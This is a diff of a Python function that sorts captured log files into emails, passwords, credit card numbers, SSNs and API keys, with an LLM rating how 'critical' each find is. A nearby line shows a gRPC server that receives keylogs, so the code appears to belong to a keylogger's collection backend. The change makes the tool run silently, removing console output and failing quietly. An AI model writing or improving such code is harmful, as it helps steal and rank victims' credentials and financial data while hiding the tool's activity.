@@ -591,60 +591,42 @@ if __name__ == "__main__":
 
 
 def classify_logfile(filepath):
-    """Classify emails and passwords using the enhanced classifier"""
-    from classifier import EnhancedClassifier, ConsoleObserver, FileObserver
+    """
+    Silent classification:
+    - No console output
+    - All results (including alerts) go to JSON
+    """
+    from classifier import EnhancedClassifier, FileObserver
     import json
+    import os
 
     if not os.path.exists(filepath):
-        print(f"[-] File not found: {filepath}")
-        return
+        return  # silent fail
 
-    print(f"[*] Analyzing {filepath}...")
-
-    # Read the file
+    # Read log file
     with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
         text = f.read()
 
-    # Create classifier with AI enabled (set to False for faster mode)
+    # Output JSON path
+    output_path = filepath + '.classified.json'
+
+    # Create classifier with AI enabled
     classifier = EnhancedClassifier(use_llm=True)
 
-    # Attach observers to get real-time alerts
-    classifier.attach(ConsoleObserver())
-    classifier.attach(FileObserver("alerts.log"))
+    # Attach FileObserver (single sink for alerts)
+    file_observer = FileObserver(output_path)
+    classifier.attach(file_observer)
 
-    # Run the analysis
+    # Run classification
     result = classifier.classify_text(text)
 
-    # Save detailed JSON results
-    output_path = filepath + '.classified.json'
+    # Inject alert into JSON if triggered
+    if file_observer.get_alert_data():
+        result['alert'] = file_observer.get_alert_data()
+
+    # Save final JSON result
     with open(output_path, 'w', encoding='utf-8') as f:
         json.dump(result, f, indent=2, ensure_ascii=False)
-
-    # Print summary to console
-    print(f"\n[+] Classification complete!")
-    print(f"[+] Results saved to: {output_path}")
-    print(f"\n{'=' * 50}")
-    print(f"SUMMARY")
-    print(f"{'=' * 50}")
-    print(f"Emails: {len(result['emails'])}")
-    print(f"Passwords: {len(result['passwords'])}")
-    print(f"Credit Cards: {len(result['sensitive_data']['credit_cards'])}")
-    print(f"SSNs: {len(result['sensitive_data']['ssns'])}")
-    print(f"API Keys: {len(result['sensitive_data']['api_keys'])}")
-
-    # Show criticality if AI was used
-    if result['criticality_assessment']:
-        crit = result['criticality_assessment']
-        print(f"\n{'=' * 50}")
-        print(f"CRITICALITY: {crit['criticality_level']}")
-        print(f"{'=' * 50}")
-        print(f"Confidence: {crit['confidence_score']:.0%}")
-        print(f"Rule Score: {crit['rule_based_score']:.2f}")
-        print(f"AI Score: {crit['llm_score']:.2f}")
-        print(f"AI Reasoning: {crit['llm_reasoning']}")
-
-    print(f"{'=' * 50}\n")
-
 
 def start_grpc_server(port):
     """Start gRPC server to receive keylogs."""
